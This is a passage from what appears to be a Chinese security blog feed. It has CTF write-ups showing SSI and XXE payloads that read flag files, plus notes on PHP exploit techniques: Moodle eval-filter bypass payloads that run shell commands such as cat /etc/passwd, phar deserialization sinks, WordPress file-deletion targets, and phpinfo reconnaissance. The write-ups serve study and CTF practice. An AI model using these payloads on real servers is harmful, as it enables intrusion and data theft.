class="string">'Your grades is 0'</span> <span class="keyword">not</span> <span class="keyword">in</span> ans.content:</div><div class="line">            f=chr(j)</div><div class="line">            <span class="keyword">print</span> f</div><div class="line">            flag=flag+f</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line">            <span class="keyword">break</span></div><div class="line">        lout = req.get(logout)</div></pre></td></tr></table></figure><h2 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述:"></a>题目描述:</h3><p>SimpleServerInjection, SSI, flag in current directory</p><p><a href="http://210.32.4.22/index.php" target="_blank" rel="external">http://210.32.4.22/index.php</a></p><h3 id="题目解析-2"><a href="#题目解析-2" class="headerlink" title="题目解析:"></a>题目解析:</h3><p>了解到是ssi，提示了读flag文件，常规payload发现<code>#</code>号后内容被截断，于是采用编码绕过。</p><p><a href="https://i.loli.net/2018/11/16/5bee89b30c593.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/16/5bee89b30c593.png" alt="屏幕快照 2018-11-16 下午5.07.19.png"></a><br><a href="https://i.loli.net/2018/11/16/5bee89b30e32f.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/16/5bee89b30e32f.png" alt="屏幕快照 2018-11-16 下午5.08.55.png"></a></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--%23include+virtual%3D&quot;flag&quot;+--&gt;</div></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h3><p><a href="https://junookyo.blogspot.com/2012/03/shtml-bypass-view-symlink-server-side.html" target="_blank" rel="external">https://junookyo.blogspot.com/2012/03/shtml-bypass-view-symlink-server-side.html</a></p><p><a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="external">https://www.secpulse.com/archives/66934.html</a></p><p><a href="http://xdxd.love/2015/12/09/ssi%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/" target="_blank" rel="external">http://xdxd.love/2015/12/09/ssi%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/</a></p><h2 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述:"></a>题目描述:</h3><p>SimpleExtensionExplorerInjection, XXE, /flag</p><p><a href="http://210.32.4.21:8080/www/index.html" target="_blank" rel="external">http://210.32.4.21:8080/www/index.html</a></p><h3 id="题目解析-3"><a href="#题目解析-3" class="headerlink" title="题目解析:"></a>题目解析:</h3><p>1.burp抓包发现采用json格式传输数据</p><p><a href="https://i.loli.net/2018/11/16/5bee8a4b4c115.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/16/5bee8a4b4c115.png" alt="屏幕快照 2018-11-16 下午5.13.33.png"></a></p><p>2.修改<code>Content-Type</code>字段为<code>xml</code>，尝试post xml格式数据</p><p>根据请求和响应发现存在xxe漏洞</p><p>请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST /www/ HTTP/1.1</div><div class="line">Host: 210.32.4.21:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</div><div class="line">Accept: */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://210.32.4.21:8080/www/index.html</div><div class="line">Content-Type: application/xml; charset=UTF-8</div><div class="line">Content-Length: 73</div><div class="line">Connection: close</div><div class="line"></div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class="line">&lt;name&gt;zzz&lt;/name&gt;</div><div class="line">&lt;age&gt;zzz&lt;/age&gt;</div></pre></td></tr></table></figure></p><p>响应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 500 </div><div class="line">Content-Type: application/json;charset=UTF-8</div><div class="line">Date: Fri, 16 Nov 2018 09:17:40 GMT</div><div class="line">Connection: close</div><div class="line">Content-Length: 254</div><div class="line"></div><div class="line">&#123;&quot;timestamp&quot;:&quot;2018-11-16T09:17:40.797+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;org.xml.sax.SAXParseException; lineNumber: 3; columnNumber: 2; The markup in the document following the root element must be well-formed.&quot;,&quot;path&quot;:&quot;/www/&quot;&#125;</div></pre></td></tr></table></figure><p>3.依据提示<code>/flag</code>，直接去读文件</p><p>请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">POST /www/ HTTP/1.1</div><div class="line">Host: 210.32.4.21:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</div><div class="line">Accept: */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://210.32.4.21:8080/www/index.html</div><div class="line">Content-Type: application/xml; charset=UTF-8</div><div class="line">Content-Length: 151</div><div class="line">Connection: close</div><div class="line"></div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;name&lt;/name&gt;</div><div class="line">&lt;age&gt;&amp;xxe;&lt;/age&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure></p><p>响应:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 </div><div class="line">Content-Type: text/plain;charset=UTF-8</div><div class="line">Content-Length: 64</div><div class="line">Date: Fri, 16 Nov 2018 09:21:23 GMT</div><div class="line">Connection: close</div><div class="line"></div><div class="line">Received name: name, age: EIS&#123;bce52c116d589ae9472e59a162cc90e2&#125;</div></pre></td></tr></table></figure><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考:"></a>参考:</h3><p><a href="https://blog.netspi.com/playing-content-type-xxe-json-endpoints/" target="_blank" rel="external">https://blog.netspi.com/playing-content-type-xxe-json-endpoints/</a></p><p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="external">https://thief.one/2017/06/20/1/</a></p><h2 id="SimplePrintEventLogger"><a href="#SimplePrintEventLogger" class="headerlink" title="SimplePrintEventLogger"></a>SimplePrintEventLogger</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述:"></a>题目描述:</h3><p>SimplePrintEventLogger, same server as SimpleExtensionExploreInjection , RCE, flag in /</p><p><a href="http://210.32.4.21:8080/www/index.html" target="_blank" rel="external">http://210.32.4.21:8080/www/index.html</a></p><h3 id="题目解析-4"><a href="#题目解析-4" class="headerlink" title="题目解析:"></a>题目解析:</h3><p>同一个题目的服务器上，flag在根目录，手动翻一下就好</p><p>请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">POST /www/ HTTP/1.1</div><div class="line">Host: 210.32.4.21:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</div><div class="line">Accept: */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://210.32.4.21:8080/www/index.html</div><div class="line">Content-Type: application/xml; charset=UTF-8</div><div class="line">Content-Length: 147</div><div class="line">Connection: close</div><div class="line"></div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;name&lt;/name&gt;</div><div class="line">&lt;age&gt;&amp;xxe;&lt;/age&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure></p><p>响应<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 </div><div class="line">Content-Type: text/plain;charset=UTF-8</div><div class="line">Content-Length: 169</div><div class="line">Date: Fri, 16 Nov 2018 16:46:04 GMT</div><div class="line">Connection: close</div><div class="line"></div><div class="line">Received name: name, age: .dockerenv</div><div class="line">bin</div><div class="line">boot</div><div class="line">dev</div><div class="line">docker-java-home</div><div class="line">etc</div><div class="line">flag</div><div class="line">flagvvvvvaaaagegsgag2333</div><div class="line">home</div><div class="line">lib</div><div class="line">lib64</div><div class="line">media</div><div class="line">mnt</div><div class="line">opt</div><div class="line">proc</div><div class="line">root</div><div class="line">run</div><div class="line">sbin</div><div class="line">srv</div><div class="line">sys</div><div class="line">tmp</div><div class="line">usr</div><div class="line">var</div></pre></td></tr></table></figure></p><p>读取<code>flagvvvvvaaaagegsgag2333</code></p><p>请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">POST /www/ HTTP/1.1</div><div class="line">Host: 210.32.4.21:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</div><div class="line">Accept: */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://210.32.4.21:8080/www/index.html</div><div class="line">Content-Type: application/xml; charset=UTF-8</div><div class="line">Content-Length: 171</div><div class="line">Connection: close</div><div class="line"></div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///flagvvvvvaaaagegsgag2333&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;name&lt;/name&gt;</div><div class="line">&lt;age&gt;&amp;xxe;&lt;/age&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure><p>响应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 </div><div class="line">Content-Type: text/plain;charset=UTF-8</div><div class="line">Content-Length: 64</div><div class="line">Date: Fri, 16 Nov 2018 16:47:38 GMT</div><div class="line">Connection: close</div><div class="line"></div><div class="line">Received name: name, age: EIS&#123;f501e9c5323c560b0a40192ce9b7ad38&#125;</div></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>2018最新PHP漏洞利用技巧</title>
      <link href="/2018/11/13/New-PHP-exploit-techniques/"/>
      <url>/2018/11/13/New-PHP-exploit-techniques/</url>
      <content type="html"><![CDATA[<h2 id="0x00-综述"><a href="#0x00-综述" class="headerlink" title="0x00 综述"></a>0x00 综述</h2><p>本文学习了几种新式的php exploit方法，在此做一笔记</p><ul><li>文件删除漏洞, unlink()</li><li>Phar 反序列化, file*()</li><li>PHP对象实例化, ReflectionClass()</li></ul><h2 id="0x01-WordPress-Design-Flaw-Leads-to-WooCommerce-RCE"><a href="#0x01-WordPress-Design-Flaw-Leads-to-WooCommerce-RCE" class="headerlink" title="0x01 WordPress Design Flaw Leads to WooCommerce RCE"></a>0x01 WordPress Design Flaw Leads to WooCommerce RCE</h2><p>WooCommerce 3.4.6本版本之前存在任意删除漏洞，因为WordPress的设计缺陷将导致整站被接管。</p><p>设计缺陷:</p><ul><li>WooCommerce插件被关闭之后edit_users权限依旧存在</li><li>但是插件的disallow_editing_of_admins过滤器不会再被触发</li><li>一般只有administrators可以关闭插件，（但是我们这里有任意文件删除，相当于关闭了插件）</li></ul><p>参考：<br><a href="https://blog.ripstech.com/2018/wordpress-design-flaw-leads-to-woocommerce-rce/" target="_blank" rel="external">https://blog.ripstech.com/2018/wordpress-design-flaw-leads-to-woocommerce-rce/</a></p><h2 id="0x02-Moodle-lt-3-5-0"><a href="#0x02-Moodle-lt-3-5-0" class="headerlink" title="0x02 Moodle &lt; 3.5.0"></a>0x02 Moodle &lt; 3.5.0</h2><p>Code Injection</p><p>首先，教师角色是必须的(可以利用xss得到)</p><p>使用了eval函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">substitute_variables_and_eval</span><span class="params">($str, $dataset)</span> </span>&#123;</div><div class="line"><span class="comment">// substitues &#123;x&#125; and &#123;y&#125; for numbers like 1.2 with str_replace():</span></div><div class="line">        $formula = <span class="keyword">$this</span>-&gt;substitute_variables($str, $dataset);  </div><div class="line">        <span class="keyword">if</span> ($error = qtype_calculated_find_formula_errors($formula)) &#123;     </div><div class="line">            <span class="keyword">return</span> $error;<span class="comment">// formula security mechanism</span></div><div class="line">        &#125;</div><div class="line">        $str=<span class="keyword">null</span>;</div><div class="line">        <span class="keyword">eval</span>(<span class="string">'$str = '</span>.$formula.<span class="string">';'</span>);<span class="comment">// dangerous eval()-call</span></div><div class="line">        <span class="keyword">return</span> $str;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>但是有过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">qtype_calculated_find_formula_errors</span><span class="params">($formula)</span> </span>&#123;</div><div class="line">    <span class="comment">// Returns false if everything is alright</span></div><div class="line">    <span class="comment">// otherwise it constructs an error message.</span></div><div class="line">    <span class="comment">// Strip away dataset names.</span></div><div class="line">    <span class="keyword">while</span> (preg_match(<span class="string">'~\\&#123;[[:alpha:]][^&gt;&#125; &lt;&#123;"\']*\\&#125;~'</span>, $formula, $regs))&#123;</div><div class="line">        $formula = str_replace($regs[<span class="number">0</span>], <span class="string">'1'</span>, $formula);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// Strip away empty space and lowercase it.</span></div><div class="line">    $formula = strtolower(str_replace(<span class="string">' '</span>, <span class="string">''</span>, $formula));</div><div class="line"></div><div class="line">    $safeoperatorchar = <span class="string">'-+/*%&gt;:^\~&lt;?=&amp;|!'</span>; <span class="comment">/* */</span></div><div class="line">    $operatorornumber = <span class="string">"[&#123;$safeoperatorchar&#125;.0-9eE]"</span>;</div><div class="line"></div><div class="line">    <span class="comment">// [...]</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"~[^&#123;$safeoperatorchar&#125;.0-9eE]+~"</span>, $formula, $regs)) &#123;</div><div class="line">        <span class="keyword">return</span> get_string(<span class="string">'illegalformulasyntax'</span>,<span class="string">'qtype_calculated'</span>,$regs[<span class="number">0</span>]);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="comment">// Formula just might be valid.</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>bypass过滤<br><a href="https://i.loli.net/2018/11/13/5beaccdb43658.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/13/5beaccdb43658.png" alt="屏幕快照 2018-11-13 下午9.06.43.png"></a></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.&#123;a.`$_GET[0]`&#125;</div><div class="line">2. /*&#123;a*/`$_GET[0]`;//&#123;x&#125;&#125;</div><div class="line"></div><div class="line">=&gt; 0=(date;cat/etc/passwd)&gt;../hi.txt</div></pre></td></tr></table></figure><p><strong>bypass官方补丁</strong></p><p>1.Blacklist</p><p>补丁说明:循环检测输入中是否存在//,/*,#<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">qtype_calculated_find_formula_errors</span><span class="params">($formula)</span> </span>&#123;</div><div class="line"><span class="keyword">foreach</span> ([<span class="string">'//'</span>, <span class="string">'/*'</span>, <span class="string">'#'</span>] <span class="keyword">as</span> $commentstart) &#123;</div><div class="line"><span class="keyword">if</span> (strpos($formula, $commentstart) !== <span class="keyword">false</span>) &#123;</div><div class="line"><span class="keyword">return</span> get_string(<span class="string">'illegalformulasyntax'</span>,</div><div class="line">  <span class="string">'qtype_calculated'</span>, </div><div class="line">   $commentstart);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1?&gt;&lt;?=log(1)&#123;a.`$_GET[0]`.(&#123;x&#125;)&#125;?&gt;</div></pre></td></tr></table></figure><p>2.拒绝使用占位符嵌套</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find_dataset_names</span><span class="params">($text)</span> </span>&#123;</div><div class="line"><span class="comment">// Returns the possible dataset names found in the text as an array.</span></div><div class="line"><span class="comment">// The array has the dataset name for both key and value.</span></div><div class="line"><span class="keyword">if</span> (preg_match_all(<span class="string">'~\\&#123;([[:alpha:]][^&gt;&#125; &lt;&#123;"\']*)\\&#125;~'</span>,$text,$regs)) &#123;</div><div class="line">$datasetnames = array_unique($regs[<span class="number">1</span>]);</div><div class="line">            <span class="keyword">return</span> array_combine($datasetnames, $datasetnames);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">return</span> [];</div><div class="line">        &#125;</div><div class="line">     &#125;</div><div class="line"><span class="comment">// [...]</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">qtype_calculated_find_formula_errors</span><span class="params">($formula)</span> </span>&#123;</div><div class="line">    $datasetnames = find_dataset_names($formula);</div><div class="line">    <span class="keyword">foreach</span> ($datasetnames <span class="keyword">as</span> $datasetname) &#123;</div><div class="line">        $formula = str_replace(<span class="string">'&#123;'</span>.$datasetname.<span class="string">'&#125;'</span>, <span class="string">'1'</span>, $formula);</div><div class="line">     &#125;</div></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*&#123;x&#125;&#123;a*/</span>`$_GET[<span class="number">0</span>]`<span class="comment">/*(1)//&#125;&#123;a*/</span>`$_GET[<span class="number">0</span>]`<span class="comment">/*(&#123;x&#125;)//&#125;*/</span></div></pre></td></tr></table></figure><p>3.黑名单+线性替换</p><p>控制xml实现</p><p>参考:</p><p><a href="https://blog.ripstech.com/2018/moodle-remote-code-execution/" target="_blank" rel="external">https://blog.ripstech.com/2018/moodle-remote-code-execution/</a></p><h2 id="0x03-WordPress-File-Delete-to-Code-Execution"><a href="#0x03-WordPress-File-Delete-to-Code-Execution" class="headerlink" title="0x03 WordPress File Delete to Code Execution"></a>0x03 WordPress File Delete to Code Execution</h2><p>影响范围: =&lt;4.9.6</p><p>前提:拥有媒体文件的删除权限(只能利用其它漏洞或者错误配置来取得)</p><p>删除目标:</p><p><code>.htaccess</code> 有时其中会包含一些安全策略(比如:访问某些文件夹的权限)，删除后会是安全策略无效。</p><p><code>index.php files</code> 一般这个文件是空的，主要是为了防止列目录，被删除了就有可能去列目录了。</p><p><code>wp-config.php</code> 这个删除了，WordPress就要被重装了。</p><p>参考:<a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="external">https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</a></p><h2 id="0x04-Phar-Deserialization"><a href="#0x04-Phar-Deserialization" class="headerlink" title="0x04 Phar:// Deserialization"></a>0x04 Phar:// Deserialization</h2><p>敏感点:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">include</span>(<span class="string">'phar://test.phar'</span>);</div><div class="line">file_get_contents(<span class="string">'phar://test.phar'</span>);</div><div class="line">file_put_contents(<span class="string">'phar://test.phar'</span>, <span class="string">''</span>);</div><div class="line">copy(<span class="string">'phar://test.phar'</span>, <span class="string">''</span>);</div><div class="line"><span class="keyword">include</span>(<span class="string">'phar://test.phar'</span>);</div><div class="line">file_get_contents(<span class="string">'phar://test.phar'</span>);</div><div class="line">file_put_contents(<span class="string">'phar://test.phar'</span>, <span class="string">''</span>);</div><div class="line">copy(<span class="string">'phar://test.phar'</span>, <span class="string">''</span>);</div><div class="line">file_exists(<span class="string">'phar://test.phar'</span>);</div><div class="line">is_executable(<span class="string">'phar://test.phar'</span>);</div><div class="line">is_file(<span class="string">'phar://test.phar'</span>);</div><div class="line">is_dir(<span class="string">'phar://test.phar'</span>);</div><div class="line">is_link(<span class="string">'phar://test.phar'</span>);</div><div class="line">is_writable(<span class="string">'phar://test.phar'</span>);</div><div class="line">fileperms(<span class="string">'phar://test.phar'</span>);</div><div class="line">fileinode(<span class="string">'phar://test.phar'</span>);</div><div class="line">filesize(<span class="string">'phar://test.phar'</span>);</div><div class="line">fileowner(<span class="string">'phar://test.phar'</span>);</div><div class="line">filegroup(<span class="string">'phar://test.phar'</span>); fileatime(<span class="string">'phar://test.phar'</span>);</div><div class="line">filemtime(<span class="string">'phar://test.phar'</span>);</div><div class="line">filectime(<span class="string">'phar://test.phar'</span>);</div><div class="line">filetype(<span class="string">'phar://test.phar'</span>);</div><div class="line">getimagesize(<span class="string">'phar://test.phar'</span>);</div><div class="line">exif_read_data(<span class="string">'phar://test.phar'</span>);</div><div class="line">stat(<span class="string">'phar://test.phar'</span>); </div><div class="line">lstat(<span class="string">'phar://test.phar'</span>);</div><div class="line">touch(<span class="string">'phar://test.phar‘);</span></div><div class="line">md5_file('phar:<span class="comment">//test.phar');</span></div></pre></td></tr></table></figure></p><p>可以参考:</p><p><a href="https://blog.ripstech.com/2018/new-php-exploitation-technique/" target="_blank" rel="external">https://blog.ripstech.com/2018/new-php-exploitation-technique/</a></p><p><a href="http://seaii-blog.com/index.php/2018/08/23/86.html" target="_blank" rel="external">http://seaii-blog.com/index.php/2018/08/23/86.html</a></p><p><a href="https://www.anquanke.com/post/id/157657" target="_blank" rel="external">https://www.anquanke.com/post/id/157657</a></p><p><a href="https://www.anquanke.com/post/id/157439" target="_blank" rel="external">https://www.anquanke.com/post/id/157439</a></p><h2 id="0x05-Shopware-lt-5-3-4-PHP-Object-Instantiation-to-XXE-to-RCE"><a href="#0x05-Shopware-lt-5-3-4-PHP-Object-Instantiation-to-XXE-to-RCE" class="headerlink" title="0x05 Shopware &lt; 5.3.4 PHP Object Instantiation to XXE to RCE"></a>0x05 Shopware &lt; 5.3.4 PHP Object Instantiation to XXE to RCE</h2><p>影响范围:Shopware version &lt;= 5.3.3 and &gt;= 5.1</p><p>XSS→POI→XMLi→XXE→PHAR→POI→POP→RCE</p><p>参考:<br><a href="https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/" target="_blank" rel="external">https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/</a></p><p>突然发现有人翻译过<br><a href="https://www.freebuf.com/vuls/154415.html" target="_blank" rel="external">https://www.freebuf.com/vuls/154415.html</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>phpinfo可以告诉我们什么</title>
      <link href="/2018/11/13/what-phpinfo-can-tell-we/"/>
      <url>/2018/11/13/what-phpinfo-can-tell-we/</url>
      <content type="html"><![CDATA[<h2 id="0x00-基本信息"><a href="#0x00-基本信息" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h2><h3 id="system-info"><a href="#system-info" class="headerlink" title="system info"></a>system info</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/HE8cH44f3e.png" alt="image"></p><p>详细的操作系统信息，为提权做准备</p><h3 id="extension-dir"><a href="#extension-dir" class="headerlink" title="extension_dir"></a>extension_dir</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/BjlfKkaFAg.png" alt="image"><br>php扩展的路径</p><h3 id="真实ip"><a href="#真实ip" class="headerlink" title="真实ip"></a>真实ip</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/13al8a7Gl0.png" alt="image"><br>cdn什么的都不存在的，找到真实ip，扫一扫旁站，没准就拿下几个站。</p><h3 id="web根目录"><a href="#web根目录" class="headerlink" title="web根目录"></a>web根目录</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/4BibE1a8mJ.png" alt="image"></p><h3 id="临时文件路径"><a href="#临时文件路径" class="headerlink" title="临时文件路径"></a>临时文件路径</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/81AcH81K8j.png" alt="image"><br>向phpinfo()页面post一个shell（自己写一个上传页面），可以在_FILES[“file1”]中看到上传的临时文件，如果有个lfi，便可以直接getshell了。</p><p>phpinfo-lfi<br>利用脚本<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div 